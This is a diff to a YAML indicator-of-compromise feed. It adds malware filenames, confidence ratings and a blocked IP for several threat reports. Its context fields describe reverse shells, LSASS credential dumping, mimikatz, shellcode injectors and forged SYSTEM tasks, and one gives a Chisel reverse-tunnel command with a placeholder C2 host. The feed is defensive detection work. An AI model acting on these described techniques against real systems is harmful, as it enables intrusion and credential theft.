+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "deploy2.cmd"
+      context: "MSI deployment to a host subset via certutil and msiexec"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "deploy_all.bat"
+      context: "Implant deployment via certutil to an internal host list"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dns_add_publisherres.ps1"
+      context: "Plants an internal A record for the operator domain, third variant"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "download_and_exec.ps1"
+      context: "Generic downloader from the operator staging port"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "efspot.exe"
+      context: "Operator-written Go EfsPotato implementation"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "fix_uac.bat"
+      context: "Disables UAC and enables remote admin with local credentials"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "getsys.exe"
+      context: "Go stub, no hardcoded address recovered"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "gp.b64"
+      context: "Base64 transport encoding of gp.exe"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "gp.exe"
+      context: "Stock GodPotato, .NET x86"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "gp_reflect.ps1"
+      context: "Fileless reflective .NET loader, downloads gp.b64 and loads in memory"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "gp_run.ps1"
+      context: "Pre-staged reflective .NET loader, reads gp.b64 from disk"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "inject_from_fs01.ps1"
+      context: "Reads beacon shellcode from the victim file server over SMB and injects it"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "inject_fs_v2.ps1"
+      context: "Second iteration of the SMB-sourced shellcode injector"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "inject_sliver.ps1"
+      context: "Downloads beacon shellcode and injects it, bypassing the configured proxy"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "jedb5rox.cmd"
       context: "MSI CustomAction bootstrapper that fetches the Node runtime"
       confidence: "HIGH"
@@ -15775,6 +18606,246 @@
       value: "jlfywzakn99jpgu.xml"
       context: "Encrypted bot payload, not XML despite the extension, entropy 7.97"
       confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "jp.exe"
+      context: "Stock JuicyPotato, compiled 2018-08-10"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ld.ps1"
+      context: "LSASS minidump via MiniDumpWriteDump to C:\\Windows\\Temp\\ls.dmp"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ligolo_agent.exe"
+      context: "Ligolo-ng agent, Go 1.24.0"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mimi64.exe"
+      context: "Stock mimikatz, compiled 2022-09-19"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ms16032.ps1"
+      context: "Three-technique LPE chain incl. CVE-2016-0099, launches netcat reverse shell"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "nc64.exe"
+      context: "Operator-built Go netcat clone, source /tmp/build_nc/main.go"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "pb161_new.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "pb39_new.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ps64.exe"
+      context: "Stock PrintSpoofer"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "rragent.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "rtunnel2.exe"
+      context: null
+      confidence: "LOW"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "run_chisel.bat"
+      context: "Chisel reverse SOCKS launcher, csvc.exe client <C2>:22673 R:socks"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "s.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "s443.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "s443tls.exe"
+      context: "Go stub with hardcoded C2 on 443, TLS-capable, 28 capability rules"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "slv_beacon_sc.bin"
+      context: "Raw Sliver beacon shellcode, entropy 7.9999"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "susan_task.b64"
+      context: "Base64 batch script creating a remote SYSTEM msiexec scheduled task"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "svc37.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "svcefs.exe"
+      context: "EfsPotato, calls EfsRpcEncryptFileSrv, .NET x86"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "svchost_update.exe"
+      context: "Sliver beacon implant, symbol-obfuscated Go PE64"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "svcload.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "sys37.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "task39.xml"
+      context: "Scheduled task definition, SYSTEM, forged author"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "task39_archive.xml"
+      context: "Weekly SYSTEM scheduled task, fileless re-pull of the capstone script"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "task39_exec.xml"
+      context: "Scheduled task definition, SYSTEM, forged author"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "task39_now.xml"
+      context: "Scheduled task definition, SYSTEM, forged author"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "task39_past.xml"
+      context: "Scheduled task definition, SYSTEM, forged author, backdated trigger"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "task_39.ps1"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "task_useradd.xml"
+      context: "Scheduled task form of the backdoor account creation"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "upd443.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "update.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "webtitan_whitelist.ps1"
+      context: "Whitelists operator domain through the DNS-filter appliance admin API"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ws35.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ws36.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ws37.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ws_3srv.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ws_new31847.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ws_shell52500.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "wt_pg_whitelist.ps1"
+      context: "DNS-filter appliance reconnaissance, PostgreSQL probe and API mapping"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "wt_whitelist.ps1"
+      context: "DNS-filter whitelist plus DNS plant, discovers the API from the appliance JavaScript"
+      confidence: "DEFINITE"
       action: null
       fp_risk: null
     - type: "filename"
@@ -15947,11 +19018,11 @@
   feed_url: "/ioc-feeds/sliver-open-directory-iocs.json"
   report_url: "/reports/sliver-open-directory/"
   detection_url: "/hunting-detections/sliver-open-directory-detections"
-  total: 25
+  total: 26
   untyped: 161
   counts:
     domain: 2
-    filename: 1
+    filename: 2
     ipv4: 1
     md5: 3
     path: 3
@@ -16060,8 +19131,14 @@
       action: null
       fp_risk: "MODERATE (sihost.exe is legitimate process; false positives possible if normal injection occurs for legitimate reasons)"
     - type: "filename"
+      value: "compressed.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
       value: "onedrivesync.exe"
-      context: "Direct payload download URL; hardcoded in stager.ps1"
+      context: null
       confidence: "DEFINITE"
       action: null
       fp_risk: "none"
@@ -16127,11 +19204,11 @@
   feed_url: "/ioc-feeds/turkish-arpa-openclaw-state-insurer-209.38.205.158-iocs.json"
   report_url: "/reports/turkish-arpa-openclaw-state-insurer-209.38.205.158/"
   detection_url: "/hunting-detections/turkish-arpa-openclaw-state-insurer-209.38.205.158-detections"
-  total: 42
+  total: 55
   untyped: 32
   counts:
     domain: 12
-    filename: 1
+    filename: 14
     ipv4: 1
     path: 12
     sha256: 13
@@ -16203,9 +19280,9 @@
     - type: "domain"
       value: "soul.md"
       context: null
-      confidence: "MODERATE"
+      confidence: "DEFINITE"
       action: null
-      fp_risk: "MEDIUM, present on legitimate OpenClaw / Hermes developer environments per parent Phase 1-2 cluster"
+      fp_risk: "MEDIUM, also present on legitimate Hermes / OpenClaw developer environments"
     - type: "domain"
       value: "tools.md"
       context: "Hermes/OpenClaw tools file"
@@ -16387,7 +19464,85 @@
       action: null
       fp_risk: "none"
     - type: "filename"
+      value: "SOUL.md"
+      context: null
+      confidence: "MODERATE"
+      action: null
+      fp_risk: "MEDIUM, present on legitimate OpenClaw / Hermes developer environments per parent Phase 1-2 cluster"
+    - type: "filename"
+      value: "add_corr_endpoints.py"
+      context: "Operator-authored Python API patch script (variant 1); emits emoji-in-output bleed"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "analyze_topology.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "api_correlation_routes.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "check_corr.py"
+      context: "Operator-authored Python correlation DB query script; Turkish output SON 5 KORELASYON"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "correlation_v3.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "event_correlation_api.py"
+      context: "Operator-authored Python underlying correlations API implementation"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "fix_api.py"
+      context: "Operator-authored Python API patch script (minimal variant)"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "fix_api_endpoints.py"
+      context: "Operator-authored Python API patch script (re.replace variant)"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "fix_db.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "instana_collector_v4.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
       value: "instana_local_collector.ps1"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "patch_api.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: "none"
+    - type: "filename"
+      value: "topology_mapper.py"
       context: null
       confidence: "DEFINITE"
       action: null
@@ -16406,10 +19561,10 @@
   feed_url: "/ioc-feeds/uac-test-exe.json"
   report_url: null
   detection_url: "/hunting-detections/uac-test-exe-detections"
-  total: 11
+  total: 12
   untyped: 50
   counts:
-    filename: 5
+    filename: 6
     ipv4: 1
     md5: 1
     path: 1
@@ -16457,18 +19612,6 @@
       action: null
       fp_risk: null
     - type: "filename"
-      value: "FleetAgentAdvanced.exe"
-      context: null
-      confidence: null
-      action: null
-      fp_risk: null
-    - type: "filename"
-      value: "FleetAgentFUD.exe"
-      context: null
-      confidence: null
-      action: null
-      fp_risk: null
-    - type: "filename"
       value: "agent.exe"
       context: null
       confidence: null
@@ -16482,6 +19625,24 @@
       fp_risk: null
     - type: "filename"
       value: "agent_xworm_v2.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "fleetagentadvanced.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "fleetagentfud.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "uac_test.exe"
       context: null
       confidence: null
       action: null
@@ -16514,9 +19675,9 @@
   rows:
     - type: "ipv4"
       value: "91.236.230.250"
-      context: null
-      confidence: null
-      action: null
+      context: "Hardcoded in a.png reverse shell, hosts open directory with malware toolkit"
+      confidence: "HIGH"
+      action: "BLOCK"
       fp_risk: null
     - type: "ipv4"
       value: "91.236.230.250:443"
